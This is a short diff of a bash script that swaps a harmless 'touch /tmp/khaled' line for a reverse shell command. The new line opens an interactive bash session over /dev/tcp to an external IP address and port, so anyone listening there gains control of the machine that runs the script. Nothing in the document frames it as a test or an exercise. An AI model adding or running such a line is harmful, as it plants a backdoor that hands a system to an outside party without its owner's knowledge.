@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-touch /tmp/khaled
+/bin/bash -c bash -i >& /dev/tcp/63.177.84.139/41143 0>&1
